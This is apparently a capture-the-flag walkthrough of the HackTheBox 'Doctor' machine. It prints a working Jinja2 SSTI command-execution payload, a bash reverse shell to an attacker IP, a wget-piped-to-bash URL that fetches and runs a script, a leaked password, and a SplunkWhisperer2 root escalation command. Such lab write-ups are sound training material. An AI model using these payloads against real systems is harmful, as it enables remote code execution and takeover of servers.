---
title: HackTheBox - Doctor
date: 2021-02-07 14:37:03 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, SSTI, reverse-shell, plain text password, splunk, SplunkWhisperer2, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/Doctor.png
render_with_liquid: false
---

## Foothold

### Nmap scan (open ports)

```bash
$ nmap -min-rate 5000 --max-retries 1 -sC -sV -p- 10.10.10.209
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-16 10:19 CET
Nmap scan report for doctors.htb (10.10.10.209)
Host is up (0.094s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-server-header: 
|   Apache/2.4.41 (Ubuntu)
|_  Werkzeug/1.0.1 Python/3.8.2
| http-title: Doctor Secure Messaging - Login
|_Requested resource was http://doctors.htb/login?next=%2F
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Apache httpd 2.4.41 (port 80)

When we go to [http://10.10.10.209/](http://10.10.10.209/), one of the first thing we can notice is: 

![web](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/web.png)

After adding `doctors.htb` to `/etc/hosts` we have a totally different page:

![doctors.htb domain](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/doctors_domain.png)

### SSTI (Server Side Template Injection)

If we check the source code of the main page, we can see there is a link to [http://doctors.htb/archive](http://doctors.htb/archive) (which is commented):

![/archive](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/source_archive.png)

After trying many types of injections in [http://doctors.htb/post/new](http://doctors.htb/post/new), we can figure out that the website is vulnerable to templates injections.

As we can see:

![payload in new messages](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/post.png)

The payload above leads to this render result in [http://doctors.htb/archive](http://doctors.htb/archive)

![SSTI render result](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/SSTI.png)

Now let's do a **reverse shell**.

### Reverse shell

Thanks to the payload above, we can now call give to [http://doctors.htb/archive](http://doctors.htb/archive) another GET parameter: "**include**".

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

> We inject python templates because the target server is a **Werkzeug server version 1.0.1** using **Python version 3.8.2**

![SSTI payload add input GEt paremeter](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/SSTI_payload.png)

This parameter takes a shell command that we want to run, for instance `ls`:

![/archive?input=ls](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/input_ls.png)

In order to have a reverse shell, I created a file called **reverse.sh**:

```bash
bash -i >& /dev/tcp/10.10.14.9/4444 0>&1
```

On my machine, I ran an HTTP Server:

```bash
$ python3 -m http.server
```

If we type this URL on our browser, we have access to a shell on the target server with the user **web**:

`http://doctors.htb/archive?input=wget -O - http://10.10.14.9:8000/reverse.sh | bash`

![reverse shell as web user](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/reverse_shell.png)

## User (shaun)

There is another user on the machine: **shaun**.

```bash
web@doctor:~$ cd /home
web@doctor:/home$ ls
shaun
web
web@doctor:/home$ cd shaun
web@doctor:/home/shaun$ ls
user.txt
```

I used [`linpeas.sh`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), then I saw this interesting log:

![reset password](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/reset_password.png)

```bash
web@doctor:/var/backups$ su - shaun
su - shaun
Password: Guitar123
id
uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
# Spawning a TTY Shell
python3 -c "import pty; pty.spawn('/usr/bin/bash')"
shaun@doctor:~$
shaun@doctor:~$ cat user.txt
cat user.txt
0d5dec4a853e2f82567c3d0792b7a679
```

## Root

Remember [nmap scan](#nmap-scan-open-ports) ? We saw that `splunk` is currently running on the target sever: 

![ps auxf - splunkd](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/ps_auxf_splunkd.png)

![uncommon passwd files](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/uncommon_passwd_files.png)

By looking for _"splunk privilege escalation"_, we find this repo [https://github.com/cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2).

`PySplunkWhisperer2_remote.py` allows us to run a remote payload as `root`:

![Splunk Whispere](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/pysplunk.png)

> Payload: `python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.9 --username shaun --password Guitar123 --payload "cat /root/root.txt > /dev/shm/flag; chmod 444 /dev/shm/flag"`

Finally we got the flag:

![Root flag](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/doctor/root_flag.png)

___

## Useful links

- [PayloadsAllTheThings - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)
